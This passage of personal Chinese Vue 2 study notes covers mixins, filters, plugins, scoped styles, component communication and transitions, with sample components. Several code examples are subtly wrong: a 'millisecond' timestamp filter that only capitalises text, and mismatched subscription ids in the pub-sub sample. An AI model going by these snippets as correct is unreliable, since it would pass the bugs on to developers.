    console.log('混入对象的钩子被调用')
  }
}

new Vue({
  mixins: [mixin],
  created: function () {
    console.log('组件钩子被调用')
  }
})

// => "混入对象的钩子被调用"
// => "组件钩子被调用"
```

值为对象的选项，例如 methods, components 和 directives，将被混合为同一个对象。两个对象键名冲突时，取组件对象的键值对。

```javascript
var mixin = {
  methods: {
    foo: function () {
      console.log('foo')
    },
    conflicting: function () {
      console.log('from mixin')
    }
  }
}

var vm = new Vue({
  mixins: [mixin],
  methods: {
    bar: function () {
      console.log('bar')
    },
    conflicting: function () {
      console.log('from self')
    }
  }
})

vm.foo() // => "foo"
vm.bar() // => "bar"
vm.conflicting() // => "from self"
```

如果是 `Vue.extend()` 也将使用同样的策略进行合并。

### 示例

项目结构:

<img src="vue%E7%AC%94%E8%AE%B02.0.assets/image-20231121210150297.png" alt="image-20231121210150297" style="zoom:80%;" />

mixin.js

```js
export const hunhe = {
	methods: {
		showName(){
			alert(this.name)
		}
	},
	mounted() {
		console.log('你好啊！')
	},
}

export const hunhe2 = {
	data() {
		return {
			x:100,
			y:200
		}
	},
}
```

mian.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue' 
import {hunhe,hunhe2} from './mixin'           //
//关闭Vue的生产提示
Vue.config.productionTip = false

Vue.mixin(hunhe)                              // 全局引入
Vue.mixin(hunhe2)                             //


//创建vm
new Vue({
	el:'#app',
	render: h => h(App)
})
```

App.vue

```vue
<template>
	<div>
		<School/>
		<hr>
		<Student/>
	</div>
</template>

<script>
	import School from './components/School'
	import Student from './components/Student'

	export default {
		name:'App',
		components:{School,Student}
	}
</script>
```

School.vue

```vue
<template>
	<div>
		<h2 @click="showName">学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>

<script>
	// import {hunhe,hunhe2} from '../mixin'    	//局部引入

	export default {
		name:'School',
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
				x:666
			}
		},
		// mixins:[hunhe,hunhe2],                  //局部引入
	}
</script>
```

Student.vue

```vue
<template>
	<div>
		<h2 @click="showName">学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
	</div>
</template>

<script>
	// import {hunhe,hunhe2} from '../mixin'

	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男'
			}
		},
		// mixins:[hunhe,hunhe2]
	}
</script>
```

![](vue%E7%AC%94%E8%AE%B02.0.assets/image-20231121132705355.png)

## 过滤器

Vue.js 允许你自定义过滤器，可被用于一些常见的文本格式化。过滤器可以用在两个地方：双花括号插值和 v-bind 表达式 (后者从 2.1.0+ 开始支持)。过滤器应该被添加在 JavaScript 表达式的尾部，由“管道”符号指示。

```html
<!-- 在双花括号中 -->
{{ message | capitalize }}

<!-- 在 `v-bind` 中 -->
<div v-bind:id="rawId | formatId"></div>
```

### 一、全局过滤器

定义一个全局过滤器很简单，只需要导出一个方法即可。

使用的时候很简单，只需要在入口文件全局引入此过滤器即可，使用 `Vue.filter(key, value)` 引入。

比如，PHP后端返回的时间戳精确到秒，而JS中的时间戳是用毫秒表示，则可以定义一个转换时间戳的全局过滤器:

`main.js`

```javascript
import Vue from 'vue'
Vue.filter('millisecond', (value) => {
  if (!value) return ''
  value = value.toString()
  return value.charAt(0).toUpperCase() + value.slice(1)
})
```

在需要使用的组件使用：

```html
<div>
  {{1516101106 | millisecond}}
</div>
```

### 二、组件过滤器

组件过滤器更简单，只需在对应组件中定义 `filters` 即可，不过只针对本组件有效。

比如定义一个首字母大写的过滤器：

```javascript
export default {
  filters: {
    capitalize: function (value) {
      if (!value) return ''
      value = value.toString()
      return value.charAt(0).toUpperCase() + value.slice(1)
    }
  }
}
```

同样，使用方法一致：

```html
<div>
  {{'hello' | capitalize}}
</div>
```

## 插件

1. 功能：用于增强Vue

2. 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。

3. 定义插件：

   ```js
   对象.install = function (Vue, options) {
       // 1. 添加全局过滤器
       Vue.filter(....)
   
       // 2. 添加全局指令
       Vue.directive(....)
   
       // 3. 配置全局混入(合)
       Vue.mixin(....)
   
       // 4. 添加实例方法
       Vue.prototype.$myMethod = function () {...}
       Vue.prototype.$myProperty = xxxx
   }
   ```

4. 使用插件：```Vue.use()```

项目结构:

<img src="vue%E7%AC%94%E8%AE%B02.0.assets/image-20231121210107734.png" alt="image-20231121210107734" style="zoom:80%;" />

plugins.js

```js
export default {
	install(Vue,x,y,z){
		console.log(x,y,z)
		//全局过滤器
		Vue.filter('mySlice',function(value){
			return value.slice(0,4)
		})

		//自定义定义全局指令
		Vue.directive('fbind',{
			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		})

		//定义混入
		Vue.mixin({
			data() {
				return {
					x:100,
					y:200
				}
			},
		})

		//给Vue原型上添加一个方法（vm和vc就都能用了）
		Vue.prototype.hello = ()=>{alert('你好啊')}
	}
}
```

main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入插件
import plugins from './plugins'              //----------------
//关闭Vue的生产提示
Vue.config.productionTip = false

//应用（使用）插件
Vue.use(plugins,1,2,3)          // -------------------
//创建vm
new Vue({
	el:'#app',
	render: h => h(App)
})
```

```vue
<template>
	<div>
		<School/>
		<hr>
		<Student/>
	</div>
</template>

<script>
	import School from './components/School'
	import Student from './components/Student'

	export default {
		name:'App',
		components:{School,Student}
	}
</script>
```

```vue
<template>
	<div>
		<h2>学校名称：{{name | mySlice}}</h2> <!-- 在模板中使用 'mySlice' 过滤器 -->
		<h2>学校地址：{{address}}</h2>
		<button @click="test">点我测试一个hello方法</button>
	</div>
</template>

<script>
	export default {
		name:'School',
		data() {
			return {
				name:'尚硅谷atguigu',
				address:'北京',
			}
		},
		methods: {
			test(){
				this.hello()
			}
		},
	}
</script>
```

```vue
<template>
	<div>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<input type="text" v-fbind:value="name">    //使用插件中的fbind
	</div>
</template>

<script>
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
				sex:'男'
			}
		},
	}
</script>
```



## scoped样式

1. 作用：让样式在局部生效，防止冲突。
2. 写法：```<style scoped> 替换 <style>```

```vue
<template>
	<div class="demo">
		<h2 class="title">学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>

<script>
	export default {
		name:'School',
		data() {
			return {
				name:'尚硅谷atguigu',
				address:'北京',
			}
		}
	}
</script>

// 使用 style scoped
<style scoped>
	.demo{
		background-color: skyblue;
	}
</style>
```

## 组件间通信:crossed_swords:

### 方式1: props配置项

适用于 <strong style="color:red">父组件 ===> 子组件</strong> 

#### props 配置项[组件传参]

1. 功能：让组件接收外部传过来的数据

2. 传递数据：```<Demo 子组件props中名字="xxx">  </Demo>```

3. 接收数据：

   1. 第一种方式（只接收）：```props:['子组件props中名字'] ```

   2. 第二种方式（限制类型）：```props:{子组件props中名字:类型}```

   3. 第三种方式（限制类型、限制必要性、指定默认值）：

      ```js
      props:{
      	name:{
      	type:String, //类型
      	required:true, //必要性
      	default:'老王' //默认值
      	}
      }
      ```

   注意：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。props优先接受

main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App)
})
```

App.vue

```vue
<template>
	<div>
		<Student name="李四" sex="女" :age="100"/>    
        <!-- 传参 -->
		<!-- <MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"/> -->
	</div>
</template>

<script>
	import Student from './components/Student'

	export default {
		name:'App',
		components:{Student}
	}
</script>
```

School.vue

```vue
<template>
	<div>
		<h1>{{msg}}</h1>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生性别：{{sex}}</h2>
		<h2>学生年龄：{{myAge+1}}</h2>
		<button @click="updateAge">尝试修改收到的年龄</button>
	</div>
</template>

<script>
	export default {
		name:'Student',
		data() {
			console.log(this)
			return {
				msg:'我是一个尚硅谷的学生',
				myAge:this.age
			}
		},
		methods: {
			updateAge(){
				this.myAge++
			}
		},
		//简单声明接收
		// props:['name','age','sex'] 

		//接收的同时对数据进行类型限制
		/* props:{
			name:String,
			age:Number,
			sex:String
		} */

		//
		//接收的同时对数据：进行类型限制+默认值的指定+必要性的限制
		props:{
			name:{
				type:String, //name的类型是字符串
				required:true, //name是必要的
			},
			age:{
				type:Number,
				default:99 //默认值
			},
			sex:{
				type:String,
				required:true  //sex是必要的
			}
		}
	}
</script>
```

<img src="vue%E7%AC%94%E8%AE%B02.0.assets/image-20231121091826366.png" alt="image-20231121091826366" style="zoom:67%;" />

#### TodoList案例[传参应用]

项目结构:

<img src="vue%E7%AC%94%E8%AE%B02.0.assets/image-20231121210237497.png" alt="image-20231121210237497" style="zoom:80%;" />

**App.vue**

```vue
<template>
	<div id="root">
		<div class="todo-container">
			<div class="todo-wrap">
				<MyHeader :addTodo="addTodo"/>  //传递的是函数
				<MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"/>
				<MyFooter :todos="todos" :checkAllTodo="checkAllTodo" :clearAllTodo="clearAllTodo"/>
			</div>
		</div>
	</div>
</template>

<script>
	import MyHeader from './components/MyHeader'
	import MyList from './components/MyList'
	import MyFooter from './components/MyFooter.vue'

	export default {
		name:'App',
		components:{MyHeader,MyList,MyFooter},        // 引入组件
		data() {
			// 数据
			return {
				// 属性  // 父类属性子类可以使用
				//由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
				todos:[
					{id:'001',title:'抽烟',done:true},
					{id:'002',title:'喝酒',done:false},
					{id:'003',title:'开车',done:true}
				]
			}
		},
		methods: {

			// 对属性的操作(方法)

			//添加一个todo   // 添加一个任务
			addTodo(todoObj){
				// 给属性添加新增(往前)
				this.todos.unshift(todoObj)
			},

			//勾选or取消勾选一个todo
			checkTodo(id){
				this.todos.forEach((todo)=>{
					if(todo.id === id) todo.done = !todo.done
				})
			},
			//删除一个todo
			deleteTodo(id){
				this.todos = this.todos.filter( todo => todo.id !== id )
			},
			//全选or取消全选
			checkAllTodo(done){
				this.todos.forEach((todo)=>{
					todo.done = done
				})
			},
			//清除所有已经完成的todo
			clearAllTodo(){
				this.todos = this.todos.filter((todo)=>{
					return !todo.done
				})
			}
		}
	}
</script>

<style>
	/*base*/
	body {
		background: #fff;
	}
	.btn {
		display: inline-block;
		padding: 4px 12px;
		margin-bottom: 0;
		font-size: 14px;
		line-height: 20px;
		text-align: center;
		vertical-align: middle;
		cursor: pointer;
		box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
		border-radius: 4px;
	}
	.btn-danger {
		color: #fff;
		background-color: #da4f49;
		border: 1px solid #bd362f;
	}
	.btn-danger:hover {
		color: #fff;
		background-color: #bd362f;
	}
	.btn:focus {
		outline: none;
	}
	.todo-container {
		width: 600px;
		margin: 0 auto;
	}
	.todo-container .todo-wrap {
		padding: 10px;
		border: 1px solid #ddd;
		border-radius: 5px;
	}
</style>

```

**MyList.vue**

```vue
<template>
	<ul class="todo-main">
		<MyItem 
			v-for="todoObj in todos" :key="todoObj.id" 
			:todo="todoObj" 
			:checkTodo="checkTodo"
			:deleteTodo="deleteTodo"
		/>
	</ul>
</template>

<script>
	import MyItem from './MyItem'

	export default {
		name:'MyList',
		components:{MyItem},
		//声明接收App传递过来的数据，其中todos是自己用的，checkTodo和deleteTodo是给子组件MyItem用的
		props:['todos','checkTodo','deleteTodo']
	}
</script>

<style scoped>
	/*main*/
	.todo-main {
		margin-left: 0px;
		border: 1px solid #ddd;
		border-radius: 2px;
		padding: 0px;
	}

	.todo-empty {
		height: 40px;
		line-height: 40px;
		border: 1px solid #ddd;
		border-radius: 2px;
		padding-left: 5px;
		margin-top: 10px;
	}
</style>
```

**MyItem.vue**

```vue
<template>
	<li>
		<label>
			//  :checked 数据绑定 + @change 事件监听
			<input type="checkbox" :checked="todo.done" @change="handleCheck(todo.id)"/>
			<span>{{todo.title}}</span>
		</label>
		<button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
	</li>
</template>

<script>
	export default {
		name:'MyItem',

		//声明接收todo、checkTodo、deleteTodo  // 组件参数
		props:['todo','checkTodo','deleteTodo'],
		// 方法
		methods: {
			//勾选or取消勾选
			handleCheck(id){
				//通知App组件将对应的todo对象的done值取反
				this.checkTodo(id)
			},
			//删除
			handleDelete(id){
				if(confirm('确定删除吗？')){
					//通知App组件将对应的todo对象删除
					this.deleteTodo(id)
				}
			}
		},
	}
</script>

<style scoped>
	/*item*/
	li {
		list-style: none;
		height: 36px;
		line-height: 36px;
		padding: 0 5px;
		border-bottom: 1px solid #ddd;
	}

	li label {
		float: left;
		cursor: pointer;
	}

	li label li input {
		vertical-align: middle;
		margin-right: 6px;
		position: relative;
		top: -1px;
	}

	li button {
		float: right;
		display: none;
		margin-top: 3px;
	}

	li:before {
		content: initial;
	}

	li:last-child {
		border-bottom: none;
	}

	li:hover{
		background-color: #ddd;
	}
	
	li:hover button{
		display: block;
	}
</style>
```

**MyHeader.vue**

```vue
// 导航栏
<template>
	<div class="todo-header">
		<input type="text" placeholder="请输入你的任务名称，按回车键确认" v-model="title" @keyup.enter="add"/>
	</div>
</template>

<script>
	import {nanoid} from 'nanoid'        //使用nanoid()函数
	export default {
		name:'MyHeader',
		//接收从App传递过来的addTodo  // 这个addTodo是传递的一个函数
		props:['addTodo'],
		data() {
			return {
				//收集用户输入的title
				title:''
			}
		},
		methods: {
			add(){
				//校验数据
				if(!this.title.trim()) return alert('输入不能为空')
				//将用户的输入包装成一个todo对象
				const todoObj = {id:nanoid(), title:this.title, done:false}   //id:nanoid()得到全球唯一id
				//通知App组件去添加一个todo对象
				this.addTodo(todoObj)
				//清空输入
				this.title = ''
			}
		},
	}
</script>

<style scoped>
	/*header*/
	.todo-header input {
		width: 560px;
		height: 28px;
		font-size: 14px;
		border: 1px solid #ccc;
		border-radius: 4px;
		padding: 4px 7px;
	}

	.todo-header input:focus {
		outline: none;
		border-color: rgba(82, 168, 236, 0.8);
		box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
	}
</style>
```

**MyFooter.vue**

```vue
<template>
	<div class="todo-footer" v-show="total">
		<label>
			<!-- <input type="checkbox" :checked="isAll" @change="checkAll"/> -->
			<input type="checkbox" v-model="isAll"/>
		</label>
		<span>
			<span>已完成{{doneTotal}}</span> / 全部{{total}}
		</span>
		<button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
	</div>
</template>

<script>
	export default {
		name:'MyFooter',
		props:['todos','checkAllTodo','clearAllTodo'],
		// 计算属性
		computed: {
			//总数
			total(){
				return this.todos.length
			},
			//已完成数
			doneTotal(){
				//此处使用reduce方法做条件统计
				/* const x = this.todos.reduce((pre,current)=>{
					console.log('@',pre,current)
					return pre + (current.done ? 1 : 0)
				},0) */
				//简写
				return this.todos.reduce((pre,todo)=> pre + (todo.done ? 1 : 0) ,0)
			},

			//控制全选框
			isAll:{
				//全选框是否勾选
				get(){
					return this.doneTotal === this.total && this.total > 0
				},
				//isAll被修改时set被调用
				set(value){
					this.checkAllTodo(value)
				}
			}
		},
		methods: {
			/* checkAll(e){
				this.checkAllTodo(e.target.checked)
			} */
			//清空所有已完成
			clearAll(){
				this.clearAllTodo()
			}
		},
	}
</script>

<style scoped>
	/*footer*/
	.todo-footer {
		height: 40px;
		line-height: 40px;
		padding-left: 6px;
		margin-top: 5px;
	}

	.todo-footer label {
		display: inline-block;
		margin-right: 20px;
		cursor: pointer;
	}

	.todo-footer label input {
		position: relative;
		top: -1px;
		vertical-align: middle;
		margin-right: 5px;
	}

	.todo-footer button {
		float: right;
		margin-top: 5px;
	}
</style>
```

### 方式2: 插槽:crossed_swords:

1. 作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===> 子组件</strong> 

2. 分类：默认插槽、具名插槽、作用域插槽

3. 使用方式：

   + 默认插槽：

     ```vue
     父组件中：
             <Category>
                <div>html结构1</div>
             </Category>
     子组件中：
             <template>
                 <div>
                    <!-- 定义插槽 -->
                    <slot>插槽默认内容...</slot>
                 </div>
             </template>
     ```

   + 具名插槽：

     ```vue
     父组件中：
             <Category>
                 <template slot="center">       //1
                   <div>html结构1</div>
                 </template>
      
                 <template v-slot:footer>      //2
                    <div>html结构2</div>
                 </template>
             </Category>
     子组件中：
             <template>
                 <div>
                    <!-- 定义插槽 -->
                    <slot name="center">插槽默认内容...</slot>  //1
                    <slot name="footer">插槽默认内容...</slot>  //2
                 </div>
             </template>
     ```

   + 作用域插槽:

     理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）

     slot-scope="xxx"  通过xxx. 获得传递的参数
     
     ```vue
     父组件中：
     		<Category>
     			<template scope="scopeData">
     				<!-- 生成的是ul列表 -->
     				<ul>
     					<li v-for="g in scopeData.games" :key="g">{{g}}</li>
     				</ul>
     			</template>
     		</Category>
     
     		<Category>
     			<template slot-scope="scopeData">
     				<!-- 生成的是h4标题 -->
     				<h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
     			</template>
     		</Category>
     
     子组件中：
             <template>
                 <div>
                     <slot :games="games"></slot>
                 </div>
             </template>
     		
             <script>
                 export default {
                     name:'Category',
                     props:['title'],
                     //数据在子组件自身
                     data() {
                         return {
                             games:['红色警戒','穿越火线','劲舞团','超级玛丽']
                         }
                     },
                 }
             </script>
     ```

#### 使用vue2的写法，会报错：

##### vue2：上下对应，title是自己随便起的名字

 1、定义一个普通的插槽，可以用div，任何标签

```xml
<div slot="title"></div>
```

2、定义一个element列表里面插槽的标签

```xml
<div slot="title" slot-scope="scope"></div>
```

![img](vue%E7%AC%94%E8%AE%B02.0.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5rWp5pif,size_20,color_FFFFFF,t_70,g_se,x_16.png)

##### vue3：上下对应，title是自己随便起的名字

 1、注意，vue3中只能用template, # 等同于 slot=

```cpp
<template #title></template>
```

 2、注意，vue3中只能用template, # 等同于 slot=

```cpp
<template #title="scope"></template>
```

![image-20231127161957118](vue%E7%AC%94%E8%AE%B02.0.assets/image-20231127161957118.png)

#### 综合案例

在 Vue 3 中使用插槽：

```vue
vueCopy code<!-- ParentComponent.vue -->
<template>
  <ChildComponent>
    <!-- 使用默认插槽 -->
    <template v-slot:default="slotProps">
      <p>父组件的内容</p>
      <p>{{ slotProps.message }}</p>
    </template>

    <!-- 使用具名插槽 -->
    <template v-slot:footer="footerProps">
      <p>{{ footerProps.text }}</p>
    </template>
  </ChildComponent>
</template>

<script>
import ChildComponent from './ChildComponent.vue';

export default {
  components: {
    ChildComponent,
  },
};
</script>



vueCopy code<!-- ChildComponent.vue -->
<template>
  <div>
    <h1>子组件</h1>
    <!-- 默认插槽 -->
    <slot :message="childMessage"></slot>

    <!-- 具名插槽 -->
    <footer>
      <slot name="footer" :text="childFooterText"></slot>
    </footer>
  </div>
</template>

<script>
import { ref } from 'vue';

export default {
  setup() {
    const childMessage = ref('Hello from child!');
    const childFooterText = ref('Footer text from child');

    return {
      childMessage,
      childFooterText,
    };
  },
};
</script>
```

在这个例子中，`ParentComponent` 组件包含了一个默认插槽和一个具名插槽。`ChildComponent` 组件定义了这两个插槽，并通过 `slotProps` 和 `footerProps` 来传递数据。在父组件中，通过 `<template>` 元素的 `v-slot` 或 `#` 缩写来使用这些插槽。

父组件：

```vue
<template>
  <div class="father">
    <h3>这里是父组件</h3>
    <!--第一次使用：用flex展示数据-->
    <child>
      <template slot-scope="user">
        <div class="tmpl">
          <span v-for="item in user.data">{{item}}</span>
        </div>
      </template>
    </child>

    <!--第二次使用：用列表展示数据-->
    <child>
      <template slot-scope="user">
        <ul>
          <li v-for="item in user.data">{{item}}</li>
        </ul>
      </template>
    </child>

    <!--第三次使用：直接显示数据-->
    <child>
      <template slot-scope="user">
       {{user.data}}
      </template>
    </child>

    <!--第四次使用：不使用其提供的数据, 作用域插槽退变成匿名插槽-->
    <child>
      我就是模板
    </child>
  </div>
</template>
```

子组件：

```vue
<template>
  <div class="child">

    <h3>这里是子组件</h3>
    // 作用域插槽
    <slot  :data="data"></slot>
  </div>
</template>

 export default {
    data: function(){
      return {
        data: ['zhangsan','lisi','wanwu','zhaoliu','tianqi','xiaoba']
      }
    }
}
```

<img src="vue%E7%AC%94%E8%AE%B02.0.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hvdXlpYmluZzkzMDkyMA==,size_16,color_FFFFFF,t_70.png" alt="img" style="zoom: 67%;" />

App.vue

```vue
<template>
	<div class="container">
		<Category title="美食" >
			<!-- 图片放在 center中, 链接放在foot中-->
			<img slot="center" src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
			<a slot="footer" href="http://www.atguigu.com">更多美食</a>
		</Category>

		<Category title="游戏" >
			<ul slot="center">
				<li v-for="(g,index) in games" :key="index">{{g}}</li>
			</ul>
			<div class="foot" slot="footer">
				<a href="http://www.atguigu.com">单机游戏</a>
				<a href="http://www.atguigu.com">网络游戏</a>
			</div>
		</Category>

		<Category title="电影">
			<video slot="center" controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
			<!-- <template v-slot:footer>  省结构,指明槽 -->
			<template v-slot:footer>
				<div class="foot">
					<a href="http://www.atguigu.com">经典</a>
					<a href="http://www.atguigu.com">热门</a>
					<a href="http://www.atguigu.com">推荐</a>
				</div>
				<h4>欢迎前来观影</h4>
			</template>
		</Category>
	</div>
</template>

<script>
	import Category from './components/Category'
	export default {
		name:'App',
		components:{Category},
		data() {
			return {
				foods:['火锅','烧烤','小龙虾','牛排'],
				games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
				films:['《教父》','《拆弹专家》','《你好，李焕英》','《尚硅谷》']
			}
		},
	}
</script>

<style scoped>
	.container,.foot{
		/* 横向对齐 */
		display: flex;
		justify-content: space-around;
	}
	h4{
		text-align: center;
	}
</style>

```

Category.vue

```vue
<template>
	<div class="category">
		<h3>{{title}}分类</h3>
		<!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
		<slot name="center">我是一些默认值，当使用者没有传递具体结构时，我会出现1</slot>
		<slot name="footer">我是一些默认值，当使用者没有传递具体结构时，我会出现2</slot>
	</div>
</template>

<script>
	export default {
		name:'Category',
		props:['title']
	}
</script>

<style scoped>
	.category{
		background-color: skyblue;
		width: 200px;
		height: 300px;
	}
	h3{
		text-align: center;
		background-color: orange;
	}
	video{
		width: 100%;
	}
	img{
		width: 100%;
	}
</style>
```

<img src="vue%E7%AC%94%E8%AE%B02.0.assets/image-20231122200647002.png" alt="image-20231122200647002" style="zoom:67%;" />

### 方式3: 组件的自定义事件[类似信号]

1. 一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件(<span style="color:red">事件的回调在A中</span>）

3. 绑定自定义事件：

   1. 第一种方式，在父组件中：```<Demo @atguigu="test"/>```  或 ```<Demo v-on:atguigu="test"/>```

   2. 第二种方式，在父组件中：

      ```js
      <Demo ref="demo"/>
      ......
      mounted(){
         this.$refs.xxx.$on('atguigu',this.test)
      }
      ```

   3. 若想让自定义事件只能触发一次，可以使用```once```修饰符，或```$once```方法。

4. 触发自定义事件：```this.$emit('atguigu',数据)```		

5. 解绑自定义事件```this.$off('atguigu')```

6. 组件上也可以绑定原生DOM事件，需要使用```native```修饰符。

7. 注意：通过```this.$refs.xxx.$on('atguigu',回调)```绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！

### 方式4: 全局事件总线

1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 安装全局事件总线：main.js

   + ```vue
     new Vue({
     	......
     	beforeCreate() {
     		Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
     	},
         ......
     }) 
     ```

3. 使用事件总线：

   1. 接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span>

      ```vue
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.$bus.$on('xxxx',this.demo)
      }    
      ..........
      //取消订阅
      beforeDestroy() {
          this.$bus.$off('xxx')
          pubsub.unsubscribe(this.pubId)
      }    
      ```

   2. 提供数据：

      ```vue
      this.$bus.$emit('xxxx',数据)
      ```

### 方式5: 消息订阅与发布:crossed_swords:

1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用步骤：

   1. 安装pubsub：```npm i pubsub-js```

   2. 使用需要引入: ```import pubsub from 'pubsub-js'```

   3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身</span>

      ```vue
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息(接受)
      }
      ..........
      //取消订阅
      beforeDestroy() {
          this.$bus.$off('xxx')
          pubsub.unsubscribe(this.pubId)
      }
      ```

   4. 提供数据：
   
      ```vue
      pubsub.publish('xxx',数据)
      ```

## 过度与动画

Vue 在插入、更新或者移除 DOM 时，提供多种不同方式的应用过渡效果。

包括以下工具：

- 在 CSS 过渡和动画中自动应用 class
- 可以配合使用第三方 CSS 动画库，如 Animate.css
- 在过渡钩子函数中使用 JavaScript 直接操作 DOM
- 可以配合使用第三方 JavaScript 动画库，如 Velocity.js

<a name="kkOvs"></a>

### 一、过渡的不同阶段

在进入/离开的过渡中，会有 6 个 class 切换。

1. `v-enter`：定义进入过渡的开始状态。在元素被插入时生效，在下一个帧移除。
2. `v-enter-active`：定义过渡的状态。在元素整个过渡过程中作用，在元素被插入时生效，在 `transition/animation` 完成之后移除。这个类可以被用来定义过渡的过程时间，延迟和曲线函数。
3. `v-enter-to`: **2.1.8版及以上** 定义进入过渡的结束状态。在元素被插入一帧后生效 (与此同时 `v-enter` 被删除)，在 `transition/animation` 完成之后移除。
4. `v-leave`: 定义离开过渡的开始状态。在离开过渡被触发时生效，在下一个帧移除。
5. `v-leave-active`：定义过渡的状态。在元素整个过渡过程中作用，在离开过渡被触发后立即生效，在 `transition/animation` 完成之后移除。这个类可以被用来定义过渡的过程时间，延迟和曲线函数。
6. `v-leave-to`: **2.1.8版及以上** 定义离开过渡的结束状态。在离开过渡被触发一帧后生效 (与此同时 `v-leave` 被删除)，在 `transition/animation` 完成之后移除。

对于这些在 `enter/leave` 过渡中切换的类名，`v-` 是这些类名的前缀。使用 `<transition name="my-transition">` 可以重置前缀，比如 `v-enter` 替换为 `my-transition-enter`。

示例：

```vue
<template lang="pug">
div
  button(v-on:click="show = !show") Toggle
  transition(name="fade")
    p(v-if="show") hello
</template>

<script>
export default {
  data() {
    return {
      show: true
    }
  }
}
</script>

<style>
/* 过渡过程 */
.fade-enter-active, .fade-leave-active {
  transition: opacity .5s, margin-left 1s;
}
/* 过渡的进入开始状态和离开结束状态相同 */
.fade-enter, .fade-leave-to {
  opacity: 0;
  margin-left: 20px;
}
/* 过渡的进入结束状态和离开开始状态相同 */
.fade-enter-to, .fade-leave {
  opacity: 1;
  margin-left: 0;
}
</style>
```

效果：<br />[点击查看【codepen】](https://codepen.io/quanzaiyu-the-decoder/embed/jOMVmGW)

<a name="R3c0b"></a>

### 二、自定义过渡的类名

我们可以通过以下属性来自定义过渡类名：

- `enter-class`
- `enter-active-class`
- `enter-to-class` (2.1.8+)
- `leave-class`
- `leave-active-class`
- `leave-to-class` (2.1.8+)

> 注意：自定义过渡类名的优先级高于普通的类名(name)。


比如：

```html
<template lang="pug">
div
  button(v-on:click="show = !show") Toggle
  transition(
    name="slide"
    enter-active-class="fade-enter-active"
    leave-active-class="fade-leave-active"
    enter-class="fade-enter"
    enter-to-class="fade-enter-to"
    leave-class="fade-leave"
    leave-to-class="fade-leave-to"
  )
    p(v-if="show") hello
</template>

<script>
export default {
  data() {
    return {
      show: true
    }
  }
}
</script>

<style>
/* 过渡过程 */
.fade-enter-active, .fade-leave-active {
  transition: opacity .5s, margin-left 1s;
}
/* 过渡的进入开始状态和离开结束状态相同 */
.fade-enter, .fade-leave-to {
  opacity: 0;
  margin-left: 20px;
}
/* 过渡的进入结束状态和离开开始状态相同 */
.fade-enter-to, .fade-leave {
  opacity: 1;
  margin-left: 0;
}


/* 以下过渡不会生效 */
.slide-enter-active {
  transition: all .3s ease;
}
.slide-leave-active {
  transition: all .8s cubic-bezier(1.0, 0.5, 0.8, 1.0);
}
.slide-enter, .slide-leave-to {
  transform: translateX(10px);
  opacity: 0;
}
</style>
```

上例，虽然定义了 transition 的 name 属性，但使用了自定义过渡类名，将会覆盖 name 定义的过渡效果。

<a name="4xDKj"></a>

### 三、过渡钩子

可以在属性中声明 JavaScript 钩子：

```html
<transition
  v-on:before-enter="beforeEnter"
  v-on:enter="enter"
  v-on:after-enter="afterEnter"
  v-on:enter-cancelled="enterCancelled"

  v-on:before-leave="beforeLeave"
  v-on:leave="leave"
